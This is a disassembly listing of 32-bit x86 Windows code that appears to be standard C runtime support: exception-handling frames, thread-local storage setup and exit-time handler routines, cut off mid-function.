  40422a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40422d:	52                   	push   %edx
  40422e:	e8 5d 5a 00 00       	call   0x409c90
  404233:	83 c4 08             	add    $0x8,%esp
  404236:	85 c0                	test   %eax,%eax
  404238:	74 2c                	je     0x404266
  40423a:	8b 45 14             	mov    0x14(%ebp),%eax
  40423d:	8b 48 14             	mov    0x14(%eax),%ecx
  404240:	51                   	push   %ecx
  404241:	8b 55 14             	mov    0x14(%ebp),%edx
  404244:	83 c2 08             	add    $0x8,%edx
  404247:	52                   	push   %edx
  404248:	8b 45 08             	mov    0x8(%ebp),%eax
  40424b:	8b 48 18             	mov    0x18(%eax),%ecx
  40424e:	51                   	push   %ecx
  40424f:	e8 7c 01 00 00       	call   0x4043d0
  404254:	83 c4 08             	add    $0x8,%esp
  404257:	50                   	push   %eax
  404258:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40425b:	52                   	push   %edx
  40425c:	e8 8f 5a 00 00       	call   0x409cf0
  404261:	83 c4 0c             	add    $0xc,%esp
  404264:	eb 05                	jmp    0x40426b
  404266:	e8 e5 03 00 00       	call   0x404650
  40426b:	e9 a3 00 00 00       	jmp    0x404313
  404270:	6a 01                	push   $0x1
  404272:	8b 45 08             	mov    0x8(%ebp),%eax
  404275:	8b 48 18             	mov    0x18(%eax),%ecx
  404278:	51                   	push   %ecx
  404279:	e8 e2 59 00 00       	call   0x409c60
  40427e:	83 c4 08             	add    $0x8,%esp
  404281:	85 c0                	test   %eax,%eax
  404283:	0f 84 85 00 00 00    	je     0x40430e
  404289:	6a 01                	push   $0x1
  40428b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40428e:	52                   	push   %edx
  40428f:	e8 fc 59 00 00       	call   0x409c90
  404294:	83 c4 08             	add    $0x8,%esp
  404297:	85 c0                	test   %eax,%eax
  404299:	74 73                	je     0x40430e
  40429b:	8b 45 14             	mov    0x14(%ebp),%eax
  40429e:	8b 48 18             	mov    0x18(%eax),%ecx
  4042a1:	51                   	push   %ecx
  4042a2:	e8 19 5a 00 00       	call   0x409cc0
  4042a7:	83 c4 04             	add    $0x4,%esp
  4042aa:	85 c0                	test   %eax,%eax
  4042ac:	74 60                	je     0x40430e
  4042ae:	8b 55 14             	mov    0x14(%ebp),%edx
  4042b1:	8b 02                	mov    (%edx),%eax
  4042b3:	83 e0 04             	and    $0x4,%eax
  4042b6:	85 c0                	test   %eax,%eax
  4042b8:	74 2b                	je     0x4042e5
  4042ba:	6a 01                	push   $0x1
  4042bc:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4042bf:	83 c1 08             	add    $0x8,%ecx
  4042c2:	51                   	push   %ecx
  4042c3:	8b 55 08             	mov    0x8(%ebp),%edx
  4042c6:	8b 42 18             	mov    0x18(%edx),%eax
  4042c9:	50                   	push   %eax
  4042ca:	e8 01 01 00 00       	call   0x4043d0
  4042cf:	83 c4 08             	add    $0x8,%esp
  4042d2:	50                   	push   %eax
  4042d3:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4042d6:	8b 51 18             	mov    0x18(%ecx),%edx
  4042d9:	52                   	push   %edx
  4042da:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4042dd:	50                   	push   %eax
  4042de:	e8 4d e7 ff ff       	call   0x402a30
  4042e3:	eb 27                	jmp    0x40430c
  4042e5:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4042e8:	83 c1 08             	add    $0x8,%ecx
  4042eb:	51                   	push   %ecx
  4042ec:	8b 55 08             	mov    0x8(%ebp),%edx
  4042ef:	8b 42 18             	mov    0x18(%edx),%eax
  4042f2:	50                   	push   %eax
  4042f3:	e8 d8 00 00 00       	call   0x4043d0
  4042f8:	83 c4 08             	add    $0x8,%esp
  4042fb:	50                   	push   %eax
  4042fc:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4042ff:	8b 51 18             	mov    0x18(%ecx),%edx
  404302:	52                   	push   %edx
  404303:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404306:	50                   	push   %eax
  404307:	e8 14 e7 ff ff       	call   0x402a20
  40430c:	eb 05                	jmp    0x404313
  40430e:	e8 3d 03 00 00       	call   0x404650
  404313:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40431a:	eb 0e                	jmp    0x40432a
  40431c:	b8 01 00 00 00       	mov    $0x1,%eax
  404321:	c3                   	ret
  404322:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404325:	e8 96 02 00 00       	call   0x4045c0
  40432a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40432d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404334:	5f                   	pop    %edi
  404335:	5e                   	pop    %esi
  404336:	5b                   	pop    %ebx
  404337:	8b e5                	mov    %ebp,%esp
  404339:	5d                   	pop    %ebp
  40433a:	c3                   	ret
  40433b:	cc                   	int3
  40433c:	cc                   	int3
  40433d:	cc                   	int3
  40433e:	cc                   	int3
  40433f:	cc                   	int3
  404340:	55                   	push   %ebp
  404341:	8b ec                	mov    %esp,%ebp
  404343:	6a ff                	push   $0xffffffff
  404345:	68 c8 f1 40 00       	push   $0x40f1c8
  40434a:	68 f8 5a 40 00       	push   $0x405af8
  40434f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404355:	50                   	push   %eax
  404356:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40435d:	83 ec 08             	sub    $0x8,%esp
  404360:	53                   	push   %ebx
  404361:	56                   	push   %esi
  404362:	57                   	push   %edi
  404363:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404366:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40436a:	74 49                	je     0x4043b5
  40436c:	8b 45 08             	mov    0x8(%ebp),%eax
  40436f:	8b 48 1c             	mov    0x1c(%eax),%ecx
  404372:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  404376:	74 3d                	je     0x4043b5
  404378:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40437f:	8b 55 08             	mov    0x8(%ebp),%edx
  404382:	8b 42 1c             	mov    0x1c(%edx),%eax
  404385:	8b 48 04             	mov    0x4(%eax),%ecx
  404388:	51                   	push   %ecx
  404389:	8b 55 08             	mov    0x8(%ebp),%edx
  40438c:	8b 42 18             	mov    0x18(%edx),%eax
  40438f:	50                   	push   %eax
  404390:	e8 8b e6 ff ff       	call   0x402a20
  404395:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40439c:	eb 17                	jmp    0x4043b5
  40439e:	8b 45 0c             	mov    0xc(%ebp),%eax
  4043a1:	25 ff 00 00 00       	and    $0xff,%eax
  4043a6:	f7 d8                	neg    %eax
  4043a8:	1b c0                	sbb    %eax,%eax
  4043aa:	f7 d8                	neg    %eax
  4043ac:	c3                   	ret
  4043ad:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4043b0:	e8 0b 02 00 00       	call   0x4045c0
  4043b5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4043b8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4043bf:	5f                   	pop    %edi
  4043c0:	5e                   	pop    %esi
  4043c1:	5b                   	pop    %ebx
  4043c2:	8b e5                	mov    %ebp,%esp
  4043c4:	5d                   	pop    %ebp
  4043c5:	c3                   	ret
  4043c6:	cc                   	int3
  4043c7:	cc                   	int3
  4043c8:	cc                   	int3
  4043c9:	cc                   	int3
  4043ca:	cc                   	int3
  4043cb:	cc                   	int3
  4043cc:	cc                   	int3
  4043cd:	cc                   	int3
  4043ce:	cc                   	int3
  4043cf:	cc                   	int3
  4043d0:	55                   	push   %ebp
  4043d1:	8b ec                	mov    %esp,%ebp
  4043d3:	51                   	push   %ecx
  4043d4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4043d7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4043da:	03 08                	add    (%eax),%ecx
  4043dc:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4043df:	8b 55 0c             	mov    0xc(%ebp),%edx
  4043e2:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  4043e6:	7c 27                	jl     0x40440f
  4043e8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4043eb:	8b 48 04             	mov    0x4(%eax),%ecx
  4043ee:	8b 55 08             	mov    0x8(%ebp),%edx
  4043f1:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  4043f4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4043f7:	8b 51 08             	mov    0x8(%ecx),%edx
  4043fa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4043fd:	03 0c 10             	add    (%eax,%edx,1),%ecx
  404400:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404403:	8b 55 0c             	mov    0xc(%ebp),%edx
  404406:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404409:	03 42 04             	add    0x4(%edx),%eax
  40440c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40440f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404412:	8b e5                	mov    %ebp,%esp
  404414:	5d                   	pop    %ebp
  404415:	c3                   	ret
  404416:	cc                   	int3
  404417:	cc                   	int3
  404418:	cc                   	int3
  404419:	cc                   	int3
  40441a:	cc                   	int3
  40441b:	cc                   	int3
  40441c:	cc                   	int3
  40441d:	cc                   	int3
  40441e:	cc                   	int3
  40441f:	cc                   	int3
  404420:	55                   	push   %ebp
  404421:	8b ec                	mov    %esp,%ebp
  404423:	83 ec 04             	sub    $0x4,%esp
  404426:	53                   	push   %ebx
  404427:	51                   	push   %ecx
  404428:	8b 45 0c             	mov    0xc(%ebp),%eax
  40442b:	83 c0 0c             	add    $0xc,%eax
  40442e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404431:	8b 45 08             	mov    0x8(%ebp),%eax
  404434:	55                   	push   %ebp
  404435:	ff 75 10             	push   0x10(%ebp)
  404438:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40443b:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  40443e:	e8 0a ea ff ff       	call   0x402e4d
  404443:	56                   	push   %esi
  404444:	57                   	push   %edi
  404445:	ff d0                	call   *%eax
  404447:	5f                   	pop    %edi
  404448:	5e                   	pop    %esi
  404449:	8b dd                	mov    %ebp,%ebx
  40444b:	5d                   	pop    %ebp
  40444c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40444f:	55                   	push   %ebp
  404450:	8b eb                	mov    %ebx,%ebp
  404452:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  404458:	75 05                	jne    0x40445f
  40445a:	b9 02 00 00 00       	mov    $0x2,%ecx
  40445f:	51                   	push   %ecx
  404460:	e8 e8 e9 ff ff       	call   0x402e4d
  404465:	5d                   	pop    %ebp
  404466:	59                   	pop    %ecx
  404467:	5b                   	pop    %ebx
  404468:	c9                   	leave
  404469:	c2 0c 00             	ret    $0xc
  40446c:	cc                   	int3
  40446d:	cc                   	int3
  40446e:	cc                   	int3
  40446f:	cc                   	int3
  404470:	55                   	push   %ebp
  404471:	8b ec                	mov    %esp,%ebp
  404473:	51                   	push   %ecx
  404474:	e8 b7 ef ff ff       	call   0x403430
  404479:	ff 15 4c f0 40 00    	call   *0x40f04c
  40447f:	a3 40 b0 45 00       	mov    %eax,0x45b040
  404484:	83 3d 40 b0 45 00 ff 	cmpl   $0xffffffff,0x45b040
  40448b:	75 04                	jne    0x404491
  40448d:	33 c0                	xor    %eax,%eax
  40448f:	eb 5d                	jmp    0x4044ee
  404491:	6a 61                	push   $0x61
  404493:	68 d4 f1 40 00       	push   $0x40f1d4
  404498:	6a 02                	push   $0x2
  40449a:	6a 74                	push   $0x74
  40449c:	6a 01                	push   $0x1
  40449e:	e8 2d 1d 00 00       	call   0x4061d0
  4044a3:	83 c4 14             	add    $0x14,%esp
  4044a6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044a9:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4044ad:	74 15                	je     0x4044c4
  4044af:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044b2:	50                   	push   %eax
  4044b3:	8b 0d 40 b0 45 00    	mov    0x45b040,%ecx
  4044b9:	51                   	push   %ecx
  4044ba:	ff 15 48 f0 40 00    	call   *0x40f048
  4044c0:	85 c0                	test   %eax,%eax
  4044c2:	75 04                	jne    0x4044c8
  4044c4:	33 c0                	xor    %eax,%eax
  4044c6:	eb 26                	jmp    0x4044ee
  4044c8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4044cb:	52                   	push   %edx
  4044cc:	e8 2f 00 00 00       	call   0x404500
  4044d1:	83 c4 04             	add    $0x4,%esp
  4044d4:	ff 15 44 f0 40 00    	call   *0x40f044
  4044da:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4044dd:	89 01                	mov    %eax,(%ecx)
  4044df:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4044e2:	c7 42 04 ff ff ff ff 	movl   $0xffffffff,0x4(%edx)
  4044e9:	b8 01 00 00 00       	mov    $0x1,%eax
  4044ee:	8b e5                	mov    %ebp,%esp
  4044f0:	5d                   	pop    %ebp
  4044f1:	c3                   	ret
  4044f2:	cc                   	int3
  4044f3:	cc                   	int3
  4044f4:	cc                   	int3
  4044f5:	cc                   	int3
  4044f6:	cc                   	int3
  4044f7:	cc                   	int3
  4044f8:	cc                   	int3
  4044f9:	cc                   	int3
  4044fa:	cc                   	int3
  4044fb:	cc                   	int3
  4044fc:	cc                   	int3
  4044fd:	cc                   	int3
  4044fe:	cc                   	int3
  4044ff:	cc                   	int3
  404500:	55                   	push   %ebp
  404501:	8b ec                	mov    %esp,%ebp
  404503:	8b 45 08             	mov    0x8(%ebp),%eax
  404506:	c7 40 50 48 b0 45 00 	movl   $0x45b048,0x50(%eax)
  40450d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404510:	c7 41 14 01 00 00 00 	movl   $0x1,0x14(%ecx)
  404517:	5d                   	pop    %ebp
  404518:	c3                   	ret
  404519:	cc                   	int3
  40451a:	cc                   	int3
  40451b:	cc                   	int3
  40451c:	cc                   	int3
  40451d:	cc                   	int3
  40451e:	cc                   	int3
  40451f:	cc                   	int3
  404520:	55                   	push   %ebp
  404521:	8b ec                	mov    %esp,%ebp
  404523:	83 ec 08             	sub    $0x8,%esp
  404526:	ff 15 58 f0 40 00    	call   *0x40f058
  40452c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40452f:	a1 40 b0 45 00       	mov    0x45b040,%eax
  404534:	50                   	push   %eax
  404535:	ff 15 54 f0 40 00    	call   *0x40f054
  40453b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40453e:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404542:	75 63                	jne    0x4045a7
  404544:	68 e7 00 00 00       	push   $0xe7
  404549:	68 d4 f1 40 00       	push   $0x40f1d4
  40454e:	6a 02                	push   $0x2
  404550:	6a 74                	push   $0x74
  404552:	6a 01                	push   $0x1
  404554:	e8 77 1c 00 00       	call   0x4061d0
  404559:	83 c4 14             	add    $0x14,%esp
  40455c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40455f:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404563:	74 38                	je     0x40459d
  404565:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404568:	51                   	push   %ecx
  404569:	8b 15 40 b0 45 00    	mov    0x45b040,%edx
  40456f:	52                   	push   %edx
  404570:	ff 15 48 f0 40 00    	call   *0x40f048
  404576:	85 c0                	test   %eax,%eax
  404578:	74 23                	je     0x40459d
  40457a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40457d:	50                   	push   %eax
  40457e:	e8 7d ff ff ff       	call   0x404500
  404583:	83 c4 04             	add    $0x4,%esp
  404586:	ff 15 44 f0 40 00    	call   *0x40f044
  40458c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40458f:	89 01                	mov    %eax,(%ecx)
  404591:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404594:	c7 42 04 ff ff ff ff 	movl   $0xffffffff,0x4(%edx)
  40459b:	eb 0a                	jmp    0x4045a7
  40459d:	6a 10                	push   $0x10
  40459f:	e8 2c ee ff ff       	call   0x4033d0
  4045a4:	83 c4 04             	add    $0x4,%esp
  4045a7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4045aa:	50                   	push   %eax
  4045ab:	ff 15 50 f0 40 00    	call   *0x40f050
  4045b1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4045b4:	8b e5                	mov    %ebp,%esp
  4045b6:	5d                   	pop    %ebp
  4045b7:	c3                   	ret
  4045b8:	cc                   	int3
  4045b9:	cc                   	int3
  4045ba:	cc                   	int3
  4045bb:	cc                   	int3
  4045bc:	cc                   	int3
  4045bd:	cc                   	int3
  4045be:	cc                   	int3
  4045bf:	cc                   	int3
  4045c0:	55                   	push   %ebp
  4045c1:	8b ec                	mov    %esp,%ebp
  4045c3:	6a ff                	push   $0xffffffff
  4045c5:	68 e0 f1 40 00       	push   $0x40f1e0
  4045ca:	68 f8 5a 40 00       	push   $0x405af8
  4045cf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4045d5:	50                   	push   %eax
  4045d6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4045dd:	83 ec 08             	sub    $0x8,%esp
  4045e0:	53                   	push   %ebx
  4045e1:	56                   	push   %esi
  4045e2:	57                   	push   %edi
  4045e3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4045e6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4045ed:	e8 2e ff ff ff       	call   0x404520
  4045f2:	83 78 60 00          	cmpl   $0x0,0x60(%eax)
  4045f6:	74 28                	je     0x404620
  4045f8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4045ff:	e8 1c ff ff ff       	call   0x404520
  404604:	ff 50 60             	call   *0x60(%eax)
  404607:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40460e:	eb 10                	jmp    0x404620
  404610:	b8 01 00 00 00       	mov    $0x1,%eax
  404615:	c3                   	ret
  404616:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404619:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404620:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404627:	e8 02 00 00 00       	call   0x40462e
  40462c:	eb 06                	jmp    0x404634
  40462e:	e8 fd 59 00 00       	call   0x40a030
  404633:	c3                   	ret
  404634:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404637:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40463e:	5f                   	pop    %edi
  40463f:	5e                   	pop    %esi
  404640:	5b                   	pop    %ebx
  404641:	8b e5                	mov    %ebp,%esp
  404643:	5d                   	pop    %ebp
  404644:	c3                   	ret
  404645:	cc                   	int3
  404646:	cc                   	int3
  404647:	cc                   	int3
  404648:	cc                   	int3
  404649:	cc                   	int3
  40464a:	cc                   	int3
  40464b:	cc                   	int3
  40464c:	cc                   	int3
  40464d:	cc                   	int3
  40464e:	cc                   	int3
  40464f:	cc                   	int3
  404650:	55                   	push   %ebp
  404651:	8b ec                	mov    %esp,%ebp
  404653:	6a ff                	push   $0xffffffff
  404655:	68 f8 f1 40 00       	push   $0x40f1f8
  40465a:	68 f8 5a 40 00       	push   $0x405af8
  40465f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404665:	50                   	push   %eax
  404666:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40466d:	83 ec 08             	sub    $0x8,%esp
  404670:	53                   	push   %ebx
  404671:	56                   	push   %esi
  404672:	57                   	push   %edi
  404673:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404676:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40467d:	83 3d 44 b0 45 00 00 	cmpl   $0x0,0x45b044
  404684:	74 26                	je     0x4046ac
  404686:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40468d:	ff 15 44 b0 45 00    	call   *0x45b044
  404693:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40469a:	eb 10                	jmp    0x4046ac
  40469c:	b8 01 00 00 00       	mov    $0x1,%eax
  4046a1:	c3                   	ret
  4046a2:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4046a5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4046ac:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4046b3:	e8 02 00 00 00       	call   0x4046ba
  4046b8:	eb 06                	jmp    0x4046c0
  4046ba:	e8 01 ff ff ff       	call   0x4045c0
  4046bf:	c3                   	ret
  4046c0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4046c3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4046ca:	5f                   	pop    %edi
  4046cb:	5e                   	pop    %esi
  4046cc:	5b                   	pop    %ebx
  4046cd:	8b e5                	mov    %ebp,%esp
  4046cf:	5d                   	pop    %ebp
  4046d0:	c3                   	ret
  4046d1:	cc                   	int3
  4046d2:	cc                   	int3
  4046d3:	cc                   	int3
  4046d4:	cc                   	int3
  4046d5:	cc                   	int3
  4046d6:	cc                   	int3
  4046d7:	cc                   	int3
  4046d8:	cc                   	int3
  4046d9:	cc                   	int3
  4046da:	cc                   	int3
  4046db:	cc                   	int3
  4046dc:	cc                   	int3
  4046dd:	cc                   	int3
  4046de:	cc                   	int3
  4046df:	cc                   	int3
  4046e0:	55                   	push   %ebp
  4046e1:	8b ec                	mov    %esp,%ebp
  4046e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4046e6:	8b 08                	mov    (%eax),%ecx
  4046e8:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  4046ee:	75 1e                	jne    0x40470e
  4046f0:	8b 55 08             	mov    0x8(%ebp),%edx
  4046f3:	8b 02                	mov    (%edx),%eax
  4046f5:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  4046f9:	75 13                	jne    0x40470e
  4046fb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4046fe:	8b 11                	mov    (%ecx),%edx
  404700:	81 7a 14 20 05 93 19 	cmpl   $0x19930520,0x14(%edx)
  404707:	75 05                	jne    0x40470e
  404709:	e8 b2 fe ff ff       	call   0x4045c0
  40470e:	83 3d d8 dc 45 00 00 	cmpl   $0x0,0x45dcd8
  404715:	74 1e                	je     0x404735
  404717:	a1 d8 dc 45 00       	mov    0x45dcd8,%eax
  40471c:	50                   	push   %eax
  40471d:	e8 9e 55 00 00       	call   0x409cc0
  404722:	83 c4 04             	add    $0x4,%esp
  404725:	85 c0                	test   %eax,%eax
  404727:	74 0c                	je     0x404735
  404729:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40472c:	51                   	push   %ecx
  40472d:	ff 15 d8 dc 45 00    	call   *0x45dcd8
  404733:	eb 02                	jmp    0x404737
  404735:	33 c0                	xor    %eax,%eax
  404737:	5d                   	pop    %ebp
  404738:	c2 04 00             	ret    $0x4
  40473b:	cc                   	int3
  40473c:	cc                   	int3
  40473d:	cc                   	int3
  40473e:	cc                   	int3
  40473f:	cc                   	int3
  404740:	55                   	push   %ebp
  404741:	8b ec                	mov    %esp,%ebp
  404743:	68 e0 46 40 00       	push   $0x4046e0
  404748:	ff 15 5c f0 40 00    	call   *0x40f05c
  40474e:	a3 d8 dc 45 00       	mov    %eax,0x45dcd8
  404753:	5d                   	pop    %ebp
  404754:	c3                   	ret
  404755:	cc                   	int3
  404756:	cc                   	int3
  404757:	cc                   	int3
  404758:	cc                   	int3
  404759:	cc                   	int3
  40475a:	cc                   	int3
  40475b:	cc                   	int3
  40475c:	cc                   	int3
  40475d:	cc                   	int3
  40475e:	cc                   	int3
  40475f:	cc                   	int3
  404760:	55                   	push   %ebp
  404761:	8b ec                	mov    %esp,%ebp
  404763:	a1 d8 dc 45 00       	mov    0x45dcd8,%eax
  404768:	50                   	push   %eax
  404769:	ff 15 5c f0 40 00    	call   *0x40f05c
  40476f:	5d                   	pop    %ebp
  404770:	c3                   	ret
  404771:	cc                   	int3
  404772:	cc                   	int3
  404773:	cc                   	int3
  404774:	cc                   	int3
  404775:	cc                   	int3
  404776:	cc                   	int3
  404777:	cc                   	int3
  404778:	cc                   	int3
  404779:	cc                   	int3
  40477a:	cc                   	int3
  40477b:	cc                   	int3
  40477c:	cc                   	int3
  40477d:	cc                   	int3
  40477e:	cc                   	int3
  40477f:	cc                   	int3
  404780:	55                   	push   %ebp
  404781:	8b ec                	mov    %esp,%ebp
  404783:	83 3d 74 f3 45 00 00 	cmpl   $0x0,0x45f374
  40478a:	74 06                	je     0x404792
  40478c:	ff 15 74 f3 45 00    	call   *0x45f374
  404792:	68 18 10 41 00       	push   $0x411018
  404797:	68 08 10 41 00       	push   $0x411008
  40479c:	e8 6f 01 00 00       	call   0x404910
  4047a1:	83 c4 08             	add    $0x8,%esp
  4047a4:	68 04 10 41 00       	push   $0x411004
  4047a9:	68 00 10 41 00       	push   $0x411000
  4047ae:	e8 5d 01 00 00       	call   0x404910
  4047b3:	83 c4 08             	add    $0x8,%esp
  4047b6:	5d                   	pop    %ebp
  4047b7:	c3                   	ret
  4047b8:	cc                   	int3
  4047b9:	cc                   	int3
  4047ba:	cc                   	int3
  4047bb:	cc                   	int3
  4047bc:	cc                   	int3
  4047bd:	cc                   	int3
  4047be:	cc                   	int3
  4047bf:	cc                   	int3
  4047c0:	55                   	push   %ebp
  4047c1:	8b ec                	mov    %esp,%ebp
  4047c3:	6a 00                	push   $0x0
  4047c5:	6a 00                	push   $0x0
  4047c7:	8b 45 08             	mov    0x8(%ebp),%eax
  4047ca:	50                   	push   %eax
  4047cb:	e8 30 00 00 00       	call   0x404800
  4047d0:	83 c4 0c             	add    $0xc,%esp
  4047d3:	5d                   	pop    %ebp
  4047d4:	c3                   	ret
  4047d5:	cc                   	int3
  4047d6:	cc                   	int3
  4047d7:	cc                   	int3
  4047d8:	cc                   	int3
  4047d9:	cc                   	int3
  4047da:	cc                   	int3
  4047db:	cc                   	int3
  4047dc:	cc                   	int3
  4047dd:	cc                   	int3
  4047de:	cc                   	int3
  4047df:	cc                   	int3
  4047e0:	55                   	push   %ebp
  4047e1:	8b ec                	mov    %esp,%ebp
  4047e3:	6a 00                	push   $0x0
  4047e5:	6a 01                	push   $0x1
  4047e7:	8b 45 08             	mov    0x8(%ebp),%eax
  4047ea:	50                   	push   %eax
  4047eb:	e8 10 00 00 00       	call   0x404800
  4047f0:	83 c4 0c             	add    $0xc,%esp
  4047f3:	5d                   	pop    %ebp
  4047f4:	c3                   	ret
  4047f5:	cc                   	int3
  4047f6:	cc                   	int3
  4047f7:	cc                   	int3
  4047f8:	cc                   	int3
  4047f9:	cc                   	int3
  4047fa:	cc                   	int3
  4047fb:	cc                   	int3
  4047fc:	cc                   	int3
  4047fd:	cc                   	int3
  4047fe:	cc                   	int3
  4047ff:	cc                   	int3
  404800:	55                   	push   %ebp
  404801:	8b ec                	mov    %esp,%ebp
  404803:	51                   	push   %ecx
  404804:	e8 e7 00 00 00       	call   0x4048f0
  404809:	83 3d 1c dd 45 00 01 	cmpl   $0x1,0x45dd1c
  404810:	75 11                	jne    0x404823
  404812:	8b 45 08             	mov    0x8(%ebp),%eax
  404815:	50                   	push   %eax
  404816:	ff 15 64 f0 40 00    	call   *0x40f064
  40481c:	50                   	push   %eax
  40481d:	ff 15 60 f0 40 00    	call   *0x40f060
  404823:	c7 05 18 dd 45 00 01 	movl   $0x1,0x45dd18
  40482a:	00 00 00 
  40482d:	8a 4d 10             	mov    0x10(%ebp),%cl
  404830:	88 0d 14 dd 45 00    	mov    %cl,0x45dd14
  404836:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40483a:	75 47                	jne    0x404883
  40483c:	83 3d 70 f3 45 00 00 	cmpl   $0x0,0x45f370
  404843:	74 2c                	je     0x404871
  404845:	8b 15 6c f3 45 00    	mov    0x45f36c,%edx
  40484b:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40484e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404851:	83 e8 04             	sub    $0x4,%eax
  404854:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404857:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40485a:	3b 0d 70 f3 45 00    	cmp    0x45f370,%ecx
  404860:	72 0f                	jb     0x404871
  404862:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404865:	83 3a 00             	cmpl   $0x0,(%edx)
  404868:	74 05                	je     0x40486f
  40486a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40486d:	ff 10                	call   *(%eax)
  40486f:	eb dd                	jmp    0x40484e
  404871:	68 24 10 41 00       	push   $0x411024
  404876:	68 1c 10 41 00       	push   $0x41101c
  40487b:	e8 90 00 00 00       	call   0x404910
  404880:	83 c4 08             	add    $0x8,%esp
  404883:	68 30 10 41 00       	push   $0x411030
  404888:	68 28 10 41 00       	push   $0x411028
  40488d:	e8 7e 00 00 00       	call   0x404910
  404892:	83 c4 08             	add    $0x8,%esp
  404895:	83 3d 20 dd 45 00 00 	cmpl   $0x0,0x45dd20
  40489c:	75 20                	jne    0x4048be
  40489e:	6a ff                	push   $0xffffffff
  4048a0:	e8 2b 22 00 00       	call   0x406ad0
  4048a5:	83 c4 04             	add    $0x4,%esp
  4048a8:	83 e0 20             	and    $0x20,%eax
  4048ab:	85 c0                	test   %eax,%eax
  4048ad:	74 0f                	je     0x4048be
